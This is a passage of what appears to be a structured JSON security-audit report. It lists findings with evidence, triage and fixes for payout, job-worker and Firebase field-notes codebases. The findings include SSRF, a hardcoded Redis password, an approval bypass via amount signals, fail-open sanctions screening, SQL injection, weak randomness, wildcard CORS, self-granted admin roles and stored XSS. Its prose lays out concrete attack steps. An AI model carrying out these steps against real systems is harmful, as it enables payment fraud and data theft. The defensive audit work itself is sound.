+        "narrowed_by": "Attacker control depends on how much of the args hash the manifests controller forwards, which is outside this corpus. The manifests queue itself is drained from the same Redis instance that the partner bridge writes to."
+      }
+    },
+    {
+      "title": "Webhook dispatcher posts to an arbitrary caller-supplied URL",
+      "location": {
+        "path": "dispatch-workers/app/workers/webhook_dispatch_worker.rb",
+        "symbol": "WebhookDispatchWorker#perform",
+        "line": 21
+      },
+      "class": "Server-side request forgery",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The url argument is passed straight to Faraday.new(url: url) and posted to, with no scheme restriction, no host allow-list and no private-address check. The class comment at lines 5-6 states the endpoint may be 'a one-shot callback the partner asked us to hit', so a caller-supplied destination is the documented behaviour rather than an oversight in one branch.",
+      "impact": "The worker can be directed at cloud metadata services, internal admin interfaces or other in-VPC endpoints, sending an HMAC-signed JSON body with the organisation's outbound event payload. The response body is not returned, so this is a blind SSRF usable for reachability probing and for triggering state-changing internal endpoints.",
+      "recommendation": "Restrict destinations to https, resolve the host and reject loopback, link-local and RFC1918 addresses before connecting, and prefer registered endpoints over one-shot caller-supplied URLs.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The URL is a job argument and is documented as partner-supplied, so it is not server-authored configuration."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No mitigation is being circumvented by invention: the HMAC signing at line 19 protects the body's integrity, which is an orthogonal property to where the request is sent."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A single enqueued job reproduces it deterministically; the blindness limits the payoff, which is reflected in the medium severity, not the reproducibility."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/app/workers/webhook_dispatch_worker.rb:21"
+        ],
+        "established_by": "Read the whole worker: the url parameter is used only at line 21 and no validation appears between the method signature and the connection.",
+        "narrowed_by": "Only the status code is persisted (line 33) and no response body is surfaced to the requester, so this is blind rather than a read primitive."
+      }
+    },
+    {
+      "title": "Redis connection string carries a hardcoded default password",
+      "location": {
+        "path": "dispatch-workers/config/initializers/sidekiq.rb",
+        "symbol": "REDIS_URL",
+        "line": 7
+      },
+      "class": "Hardcoded credential",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "ENV.fetch(\"SIDEKIQ_REDIS_URL\", \"redis://:sidekiq@localhost:6379/1\") embeds the password 'sidekiq' as the fallback. The constant is used for both the server and client Redis configurations (lines 14 and 27), so any deployment where the variable is unset connects with a password that is published in the source tree.",
+      "impact": "A deployment that omits the variable authenticates to Redis with a guessable, source-visible credential. Redis here holds every job payload, and per the other findings in this module write access to those queues is equivalent to privilege escalation inside the application.",
+      "recommendation": "Use ENV.fetch without a default so a missing variable fails at boot, and keep the credential out of the repository.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: a hardcoded static secret is an intrinsic flaw and stays reportable independently of whether the default is exercised in any particular environment."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "A committed credential is not the missing-header or mock-database category Rule 02 excludes; the value is live configuration for both the client and server connections."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "NOT_APPLICABLE",
+          "reason": "The file is a production initializer, not a test or fixture path."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "dispatch-workers/config/initializers/sidekiq.rb:7"
+        ],
+        "established_by": "Grepped for the constant: defined once and consumed at sidekiq.rb:14 and sidekiq.rb:27, covering both the server and client configurations.",
+        "narrowed_by": "The default only applies when SIDEKIQ_REDIS_URL is unset; a deployment that sets it never uses this value."
+      }
+    },
+    {
+      "title": "adjustAmount signal mutates the payout amount after the dual-approval gate",
+      "location": {
+        "path": "payout-orchestrator/src/workflows/payout.ts",
+        "symbol": "adjustAmount signal handler",
+        "line": 54
+      },
+      "class": "TOCTOU / approval control bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The threshold comparison at line 93 reads amountMinor once. The adjustAmount handler installed at line 54 assigns amountMinor with no bound and no re-evaluation of the gate, and Temporal delivers signals at every await point \u2014 including the corridorVolume await at line 90, the approval condition at line 95 and the postEntry await at line 103. The value the ledger is debited by (line 105) and the value submitted to the rail (line 120) are both read after the gate has already been decided.",
+      "impact": "A payout is started just under the currency threshold so the dual-approval branch is skipped, then the amount is raised by signal before the debit. The funding account is debited for the raised amount and the rail is instructed to move it, with no second approver ever involved. The same handler also desynchronises the compensation path: the reversal at line 128 credits back whatever amountMinor holds at that moment, not what postEntry actually debited.",
+      "recommendation": "Freeze the approved amount: capture it into a const after the gate and use that constant for postEntry, submitPrimary, submitCorrespondent and the reversal. Re-run the threshold test inside the signal handler and reject or re-open approval when a change crosses it.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The signal value enters through starter.ts:57, which forwards the request body's amountMinor to handle.signal; the workflow's own handler writes it into the variable the ledger later reads."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not an unstable race. Temporal delivers signals deterministically at await boundaries, and the 72-hour approval window at line 95 gives an enormous, retriable window."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The workflow itself both installs the unguarded mutator and re-reads the mutable variable after its own control decision."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/workflows/payout.ts:54",
+          "payout-orchestrator/src/workflows/payout.ts:93",
+          "payout-orchestrator/src/workflows/payout.ts:105"
+        ],
+        "established_by": "Traced every read and write of amountMinor through the workflow body: written at line 42 and line 55, read at lines 93, 105, 112, 120, 128 and 136. Only the read at line 93 gates anything, and it precedes four awaits.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "The amount-adjustment endpoint validates nothing and checks no authorization",
+      "location": {
+        "path": "payout-orchestrator/src/starter.ts",
+        "symbol": "POST /payouts/:id/amount handler",
+        "line": 57
+      },
+      "class": "Missing input validation on a money-mutating path",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The create route parses its body with payoutRequestSchema, which constrains amountMinor to a positive integer no greater than 50_000_00 (starter.ts:17). The adjust route instead casts the parsed JSON with 'as { amountMinor: number }' at line 55 \u2014 a compile-time assertion that performs no runtime check \u2014 and forwards the value straight into the signal. The payoutId is likewise taken from the URL by string splitting at line 54 with no uuid check and no verification that the caller may touch that workflow.",
+      "impact": "The signal accepts values the create schema forbids: above the 50,000-unit cap, non-integral, or negative. A negative amountMinor inverts the ledger arithmetic at ledger.ts:38 and ledger.ts:42 \u2014 'balance - (-N)' passes the floor check and increases the funding balance \u2014 turning a payout adjustment into a credit-creation primitive.",
+      "recommendation": "Parse the adjust body with a schema at least as strict as the create path, and require an authenticated, authorised principal for both routes rather than relying on the loopback bind.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The value is the raw HTTP request body read at starter.ts:55 through readJson; nothing between the socket and the signal inspects it."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Zod is used correctly two routes above, which is what makes its absence here a real gap rather than a demand for extra paranoia around a safe library."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The reported defect is missing validation on a money-moving input, not the absence of authentication in general \u2014 that broader point is recorded under ruled_out."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/starter.ts:55",
+          "payout-orchestrator/src/starter.ts:57"
+        ],
+        "established_by": "Compared the three routes in the request handler: /payouts parses with zod (line 42) and /accounts/:id/entries parses its page with zod (line 67), while /payouts/:id/amount uses a bare type assertion.",
+        "narrowed_by": "The listener binds to 127.0.0.1 (starter.ts:83), so the caller must already have loopback access to the pod \u2014 although the wildcard CORS header reported separately lets a browser on an operator's machine reach it."
+      }
+    },
+    {
+      "title": "Sanctions screening failure is swallowed and recorded as a clean result",
+      "location": {
+        "path": "payout-orchestrator/src/workflows/payout.ts",
+        "symbol": "payoutWorkflow screening catch block",
+        "line": 83
+      },
+      "class": "Fail-open compliance control",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The catch block substitutes { blocked: false, listHits: [], degraded: true } for the screening result. The next statement (line 86) branches only on screening.blocked, and the degraded flag is never read again anywhere in the workflow \u2014 grep confirms line 83 is its only assignment and there is no consumer. The proxyActivities retry policy is maximumAttempts: 3 (line 16), so after three failures the payout proceeds as though screened.",
+      "impact": "Any outage, timeout, non-2xx response or malformed body from the screening service silently converts every payout in that window into an unscreened one, including payouts to sanctioned beneficiaries. Nothing downstream distinguishes 'screened clean' from 'not screened'.",
+      "recommendation": "Fail closed: on screening error, park the payout for manual review or raise a non-retryable failure. If degraded operation is a deliberate business decision, make the degraded flag block the debit and require the same dual approval as a high-value payout.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The beneficiary details that would be screened come from the request body validated at starter.ts:11-16; the control that is meant to inspect them is what stops running."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigation was assessed pragmatically rather than presumed broken: screenBeneficiary itself does throw on a 4xx/5xx (compliance.ts:32-34), so the vendor call is correct. The workflow discards that signal."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a resource-exhaustion concern; the harm is a compliance control that stops enforcing."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/workflows/payout.ts:83"
+        ],
+        "established_by": "Read the try/catch and then grepped 'degraded' across the module: assigned at compliance.ts:42 and payout.ts:83, read nowhere. No consumer exists to act on the flag.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Sanctions mode defaults to advisory, so list hits never block a payout",
+      "location": {
+        "path": "payout-orchestrator/src/config.ts",
+        "symbol": "config.sanctionsMode",
+        "line": 20
+      },
+      "class": "Insecure default on a compliance control",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "screenBeneficiary sets blocked only when listHits.length > 0 && config.sanctionsMode === 'enforcing' (compliance.ts:40). sanctionsMode is process.env.SANCTIONS_MODE ?? 'advisory', so an unset variable yields the non-blocking mode. The workflow's only reaction to a hit is the blocked branch at payout.ts:86, and listHits is otherwise discarded, so an advisory hit produces no record inside the workflow at all.",
+      "impact": "A deployment that does not set SANCTIONS_MODE processes payouts to beneficiaries with confirmed watchlist hits and neither blocks nor durably flags them. Combined with the swallowed screening error, both routes by which screening could stop a payout are open by default.",
+      "recommendation": "Default to 'enforcing' and require an explicit opt-out, and persist listHits on the payout record regardless of mode so an advisory hit is at least reviewable.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is the enforcement switch of the sanctions control itself, not an auxiliary hardening measure."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The enforcing path was read and does work correctly; the finding is that the default selects the other path."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "This is a configuration default rather than a data-flow finding, so no ingress point applies."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/config.ts:20",
+          "payout-orchestrator/src/activities/compliance.ts:40"
+        ],
+        "established_by": "Grepped sanctionsMode: defined once in config.ts and consumed at exactly one decision point, compliance.ts:40.",
+        "narrowed_by": "A deployment that sets SANCTIONS_MODE=enforcing closes this particular gap \u2014 though the swallowed-error finding still bypasses screening entirely on the failure path."
+      }
+    },
+    {
+      "title": "corridorVolume interpolates the country code into its SQL",
+      "location": {
+        "path": "payout-orchestrator/src/activities/compliance.ts",
+        "symbol": "corridorVolume",
+        "line": 57
+      },
+      "class": "SQL injection (latent sink)",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "The count query embeds ${countryCode} inside a quoted literal, while releaseHold in the same file uses $1/$2 placeholders (compliance.ts:74) and every statement in ledger.ts is parameterised. The docstring at lines 47-49 asserts that countryCode is checked against SUPPORTED_COUNTRIES before the activity is reached, which is true of the workflow path but is a property of the caller rather than of this function. The activity is exported through activities/index.ts:6 and registered with the Temporal worker (worker.ts:15), so the task queue is a second entry point that carries none of the workflow's checks.",
+      "impact": "Anyone able to schedule an activity task on the payouts-v1 queue invokes it with an arbitrary string and injects into a query on the payouts table. Through the HTTP workflow path the value is constrained and no injection is possible today.",
+      "recommendation": "Bind the parameter: pool.query('... WHERE beneficiary_country = $1 ...', [countryCode]). The one-line change removes the dependence on both the caller and the task-queue boundary.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: a direct injection path in the function's own logic stays reportable regardless of the current callers."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Rule 13's Rule 08 exception applies. The honest position is recorded in scope: the workflow path is validated, and the residual reachability is the task queue, so severity is medium and status probable rather than confirmed."
+        },
+        {
+          "rule": "FP-10",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "code_paths is held to the single line containing the interpolation; the validating caller is described in scope, not listed as flawed code."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/activities/compliance.ts:57"
+        ],
+        "established_by": "Compared every query in the module for parameterisation, then grepped corridorVolume to enumerate its reachability: the workflow call at payout.ts:90 and the activity registration re-exported at activities/index.ts:6 and bound in worker.ts:15.",
+        "narrowed_by": "On the workflow path the value passes two filters \u2014 the /^[A-Z]{2}$/ regex at starter.ts:14 and the SUPPORTED_COUNTRIES membership test at payout.ts:69 \u2014 so injection there is impossible. The narrowing does not extend to direct activity invocation on the task queue."
+      }
+    },
+    {
+      "title": "Payment reference doubles as the rail callback secret and is generated with Math.random",
+      "location": {
+        "path": "payout-orchestrator/src/activities/rails.ts",
+        "symbol": "newReference",
+        "line": 22
+      },
+      "class": "Insecure randomness for a shared secret",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The reference is Date.now() in base 36 plus ten characters from Math.random().toString(36). The function's own comment at lines 17-20 states that the rail quotes the reference back on its status callback 'so it doubles as the callback secret'. Math.random is not cryptographically secure, and the timestamp component is essentially public \u2014 the payout request time is known to whoever submitted it. The same value is also used as the rail's idempotency-key header (line 30).",
+      "impact": "An attacker who can observe or provoke a few references recovers the generator state and predicts others, then forges rail status callbacks for payouts they do not own, or collides the idempotency key to suppress a legitimate transfer at the rail.",
+      "recommendation": "Generate the reference with crypto.randomUUID or crypto.randomBytes, and stop using it as a shared secret \u2014 authenticate rail callbacks with a signature over the payload instead.",
+      "triage": [
+        {
+          "rule": "FP-08",
+          "answer": "HOLDS",
+          "reason": "Rule 08 applies in the finding's favour: using a non-cryptographic generator for a value the code itself designates a secret is an intrinsic flaw of the function."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Math.random is not a safe standard primitive being over-scrutinised; it is explicitly unsuitable for security values and Node ships a CSPRNG alongside it."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "The callback receiver is not part of this corpus, so the forged-callback consequence could not be traced end to end; the weak generation itself is confirmed by reading the function."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/activities/rails.ts:22"
+        ],
+        "established_by": "Grepped newReference: defined at line 21 and called at lines 27 and 56, so both rail submissions and both idempotency keys derive from it.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Approval identity is self-asserted and unverified",
+      "location": {
+        "path": "payout-orchestrator/src/workflows/payout.ts",
+        "symbol": "approve signal handler",
+        "line": 47
+      },
+      "class": "Weak authorization on a dual-control check",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "The handler takes an Approval object whose approver is a caller-supplied string, and the only check is that it differs from input.requestedBy. Approvals are keyed by that string in a Map (line 49), and the gate at line 95 is satisfied by approvals.size >= 2. Nothing verifies that the two names correspond to distinct authenticated humans, that either is authorised to approve, or that the string is anything but arbitrary.",
+      "impact": "A single actor able to send signals satisfies the two-approver requirement by sending two approvals with any two different strings, defeating the dual-control that the threshold table at limits.ts:5-14 exists to enforce for higher-value payouts.",
+      "recommendation": "Do not accept the approver identity from the signal payload. Authenticate the approver at the API edge and pass a verified principal, and check it against an authorised approver list before counting it.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The approver string arrives inside the signal payload, which is caller-authored; the workflow accepts it as an identity assertion without corroboration."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The handler itself treats an unverified field as an identity; it does not depend on a caller misusing a safe function."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Marked probable: this corpus exposes no HTTP route for the approve signal, so the reachability rests on Temporal client access, which could not be verified from these files."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/workflows/payout.ts:47"
+        ],
+        "established_by": "Read the handler, the Map keying at line 49 and the size test at line 95 to establish what the gate actually counts; grepped for other consumers of the approvals map and found only the releaseHold note at line 99.",
+        "narrowed_by": "Reachable only through a Temporal signal. starter.ts exposes routes for /payouts and /payouts/:id/amount only, so no HTTP path in this corpus sends this signal."
+      }
+    },
+    {
+      "title": "Payout API sends a wildcard CORS origin on every response",
+      "location": {
+        "path": "payout-orchestrator/src/starter.ts",
+        "symbol": "createServer request handler",
+        "line": 37
+      },
+      "class": "Overly permissive CORS",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The handler sets access-control-allow-origin from config.corsOrigin as the first statement of the request callback, so it is applied to every response the server emits. config.ts:25 defaults that value to '*'. The server has no authentication of any kind, so the wildcard is not offset by a credential requirement \u2014 it makes the loopback bind at line 83 insufficient, because a browser running on the operator's host can reach 127.0.0.1 and, with the wildcard, read the response.",
+      "impact": "Any web page an operator visits can script requests to the payout API: read ledger entries for any account id via GET /accounts/:id/entries, start payouts via POST /payouts, and adjust amounts on in-flight payouts. The wildcard is what makes the responses readable rather than merely sent.",
+      "recommendation": "Default corsOrigin to the ops console origin rather than '*', and require an authenticated principal on every route so the header is not the only thing standing between a visited page and the ledger.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 02 excludes missing hardening headers such as X-Content-Type-Options. This is the opposite case: a header is present and actively grants an origin that would otherwise be denied by the same-origin policy, on an API with no other access control."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The attacker-controlled element is the origin of the page making the request; the wildcard makes any origin acceptable."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Reproducible with a single fetch from any page, given the operator's browser can route to loopback."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "payout-orchestrator/src/starter.ts:37"
+        ],
+        "established_by": "The header is set once, at the top of the createServer callback, before any routing. Reading the callback body shows all four exit points (202 at line 49, 204 at line 59, 200 at line 69, 404 at line 75, 400 at line 78) inherit it, so this single line is the whole scope of the wildcard.",
+        "narrowed_by": "No access-control-allow-credentials header is set, so cookie-bearing cross-origin requests are still refused. That does not help here because the API has no cookie or token authentication to bypass in the first place."
+      }
+    },
+    {
+      "title": "Any signed-in user can rewrite their own role and organisation list",
+      "location": {
+        "path": "fieldnotes/firestore.rules",
+        "symbol": "match /profiles/{uid} allow write",
+        "line": 31
+      },
+      "class": "Privilege escalation via client-writable authorization data",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The write rule is 'request.auth.uid == uid' with no field constraints. The profile document is the authorization record for the whole ruleset: role() reads profile().role (line 16) and memberOf reads profile().orgs (line 19). auth.js:24-30 shows the document holds role and orgs and is created client-side by the user themselves. A client that can write the document can therefore write both values.",
+      "impact": "Any authenticated user issues one write to profiles/<their-uid> setting role to 'admin' and appending any organisation id to orgs. That grants read and write on that organisation's document (line 43), read and write on every document beneath it including all inspectors' notes (line 46), and read of the audits collection that is described as an immutable trail (line 52).",
+      "recommendation": "Deny client writes to role and orgs \u2014 allow the update only when request.resource.data.role == resource.data.role and the orgs list is unchanged \u2014 and assign both server-side with the Admin SDK or custom claims.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted writer is the browser client itself: auth.js:31 performs setDoc on this exact path, so client authorship of the document is demonstrated, not assumed."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Firestore security rules are the sole access control for direct client access to the database; this is the control, not a supplementary one."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical misuse is required. The rule as written permits the escalating write, and the escalated values are consumed by other rules in the same file."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/firestore.rules:31"
+        ],
+        "established_by": "Traced every rule that depends on the profile document: role() at line 16 feeds lines 43 and 52; memberOf() at line 19 feeds lines 42, 43 and 46. All five of those decisions rest on data this rule lets the subject write.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "The admin Cloud Function has no authentication",
+      "location": {
+        "path": "fieldnotes/functions/index.js",
+        "symbol": "adminApi express app",
+        "line": 72
+      },
+      "class": "Missing authentication on a privileged endpoint",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The adminApi express app mounts only corsMiddleware. The sibling app two lines above mounts both corsMiddleware and requireIdToken (lines 42-43), so the omission is visible by direct comparison. adminApi is exported as an onRequest function (line 111) and firebase.json:7 rewrites /admin/** to it, making it publicly routable. Both of its routes use the Admin SDK, which bypasses Firestore rules entirely.",
+      "impact": "An unauthenticated internet caller enumerates any organisation's member list via GET /admin/orgs/<orgId>/members and rewrites any organisation's seat limit via POST /admin/orgs/<orgId>/seats. No token, no membership and no role is required, and the Firestore rules that would otherwise gate the orgs collection do not apply to Admin SDK reads.",
+      "recommendation": "Mount requireIdToken on adminApi and add an explicit platform-admin check on top of it; the token alone is not sufficient for administrative routes.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The ingress is an unauthenticated HTTPS request; req.params.orgId at lines 75 and 80 is attacker-chosen and selects the documents read and written."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is not authentication missing from a local-only test function. The hosting rewrite at firebase.json:7 publishes it on the production domain."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Verified by reading both middleware stacks and the export at line 111, plus the rewrite entry in firebase.json."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/functions/index.js:72",
+          "fieldnotes/functions/index.js:74",
+          "fieldnotes/functions/index.js:79"
+        ],
+        "established_by": "Compared the two express apps line by line: api mounts requireIdToken at line 43, adminApi does not. Then confirmed public routability through the firebase.json rewrite for /admin/**.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "exportOrgNotes callable performs no authentication or membership check",
+      "location": {
+        "path": "fieldnotes/functions/index.js",
+        "symbol": "exportOrgNotes",
+        "line": 88
+      },
+      "class": "Missing authorization / bulk data exfiltration",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The callable reads request.data.orgId and immediately queries orgs/<orgId>/notes with the Admin SDK, returning up to 5000 rows as CSV. request.auth is never consulted \u2014 neither for presence nor for membership. The comparable HTTP route in the same file does check membership before reading the same collection (index.js:47-50), and the function's own comment at lines 84-87 acknowledges it 'spans every inspector's notes in the org'.",
+      "impact": "A caller supplies any organisation id and receives that organisation's notes \u2014 id, owner, status, title and body for up to 5000 field inspections \u2014 bypassing both the membership check the HTTP route performs and the Firestore rules, which the Admin SDK does not evaluate.",
+      "recommendation": "Reject when request.auth is absent, then load the caller's profile and verify the requested orgId is in their orgs list, exactly as the /notes/recent route does.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "orgId comes from request.data at line 89, which is the caller-supplied callable payload, and it selects the collection that is read."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No working mitigation is being stretched: the membership check that exists elsewhere in the file is simply absent here, which was verified by reading both handlers."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The missing control is the authorization decision for a bulk export, not a defence-in-depth measure."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/functions/index.js:88"
+        ],
+        "established_by": "Read every handler in the file and checked each for a request.auth or profile lookup: /notes/recent has one at lines 47-50, this callable has none, and neither adminApi route has one.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Storage update rule drops the owner, size and content-type checks",
+      "location": {
+        "path": "fieldnotes/storage.rules",
+        "symbol": "match /orgs/{orgId}/notes/{noteId}/{fileName} allow update",
+        "line": 20
+      },
+      "class": "Broken access control on object storage",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "The update rule is 'request.auth != null' alone. The create rule directly above it (lines 14-17) requires noteOwner() == request.auth.uid, a size below 15 MB and a content type matching image/* or application/pdf; the read and delete rules (lines 12 and 22) both require ownership too. Update is the only verb in the block with none of those conditions.",
+      "impact": "Any authenticated user overwrites any existing attachment on any note in any organisation with content of any type and any size \u2014 replacing evidence photographs on another inspector's field note, planting an HTML or script payload at a path the app treats as an image, and defeating the upload size limit.",
+      "recommendation": "Give update the same predicate as create: owner check, size bound and content-type match. A rotate-or-crop re-upload is an update by the owner, which that predicate already permits.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted writer is any authenticated Storage client; notes.js:59-61 shows the client performing exactly this kind of upload to a client-chosen path."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The mitigations in this block were read and credited \u2014 create, read and delete are all correctly constrained. Update is the one verb that is not, so no adjacent rule compensates."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The rule itself grants the access; no misbehaving caller needs to be postulated."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/storage.rules:20"
+        ],
+        "established_by": "Compared all four verbs inside the same path match block; ownership appears in three of the four predicates, and the size and content-type constraints appear only on create.",
+        "narrowed_by": "The object must already exist for update to apply, so the attacker overwrites existing attachments rather than creating new ones at arbitrary paths \u2014 create still requires ownership."
+      }
+    },
+    {
+      "title": "Shared note body is written to innerHTML",
+      "location": {
+        "path": "fieldnotes/web/src/share.js",
+        "symbol": "renderSharedNote",
+        "line": 39
+      },
+      "class": "Stored cross-site scripting",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "Every other value in the function is written with textContent \u2014 the heading at line 30 and both definition-list fields at lines 9-11 \u2014 but note.body is assigned to article.innerHTML. The body is stored exactly as the client supplied it: notes.js:31-40 writes the field with no sanitisation, and neither the Firestore rules nor any function filters it on the way in or out.",
+      "impact": "A note body containing markup executes in the origin of the app when a supervisor opens the share view. The page holds the viewer's Firebase session, so the payload can read their profile, write to the profiles document that governs their role, and call the unauthenticated admin function from an authenticated context.",
+      "recommendation": "Render the body with textContent, or sanitise it through a vetted HTML sanitiser at render time if rich text is genuinely required.",
+      "triage": [
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The writer is traced: createNote at notes.js:31 and updateNote at notes.js:44 write the body field from client input, and the org-wide write rule at firestore.rules:46 lets any member of the org write another member's note."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The sink is in this function, and the surrounding lines show the author using the safe API for every other field."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no sanitiser anywhere on this path to credit; grep finds no escaping or sanitisation helper in the web sources."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "fieldnotes/web/src/share.js:39"
+        ],
+        "established_by": "Read the whole render function to confirm this is the only non-textContent assignment, then traced note.body back through notes.js to its unsanitised writes.",
+        "narrowed_by": ""
+      }
+    },
+    {
+      "title": "Org-wide subcollection rule overrides per-note ownership",
+      "location": {
+        "path": "fieldnotes/firestore.rules",
+        "symbol": "match /orgs/{orgId}/{document=**}",
+        "line": 46
+      },
+      "class": "Overly broad authorization rule",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "The recursive wildcard grants read and write on every document beneath an org to any member of that org. Notes actually live at orgs/<orgId>/notes (notes.js:19 builds the collection path that way, and functions/index.js:52 reads the same path), so this rule \u2014 not the ownership-scoped /notes/{noteId} block at lines 35-39 \u2014 is what governs field notes in practice. The top-level rule matches a collection the client code never writes to.",
+      "impact": "Any member of an organisation reads, edits and deletes every other inspector's field notes, contrary to the ownership model the ruleset states at line 34 and enforces on the unused top-level path. This is also the write primitive that makes the share-view scripting issue exploitable against colleagues.",
+      "recommendation": "Replace the recursive wildcard with explicit per-collection matches, and give orgs/{orgId}/notes/{noteId} the same ownership predicate the top-level notes block already has.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The collection path was confirmed against the client and function code (notes.js:19, functions/index.js:52), so the claim that notes live under the wildcard is read from the code rather than inferred from the rule file alone."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted actor is any org member operating the Firestore client SDK directly, which notes.js demonstrates is how the app reaches these documents."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
